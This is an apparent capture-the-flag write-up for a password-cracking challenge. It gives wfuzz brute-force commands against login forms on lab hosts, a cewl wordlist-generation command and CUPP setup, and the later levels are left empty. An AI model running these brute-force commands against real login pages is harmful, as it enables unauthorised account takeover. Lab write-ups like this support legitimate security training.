# Password Cracking Challange - Writeup
--- 

## Level 1 Default Credentials

I prefer **wfuzz** to bruteforce
```bash
wfuzz -c -z file,/usr/share/wordlists/seclists/Passwords/Default-Credentials/default-passwords.txt --sc 301,302  -d "username=admin&password=FUZZ" http://firewall.thm:5001/login
```

--- 
## Level 2 

`cewl -d 2 -m 6 --lowercase -w keywords.txt http://jobs.thm:5002`


`wfuzz -c -z file,keywords.txt  -d "username=marco&password=FUZZ" http://jobs.thm:5002/login`


---

## Level 3

git clone https://github.com/Mebus/cupp.git

python3 cupp.py -i 

---

## Level 5

---

## Level 6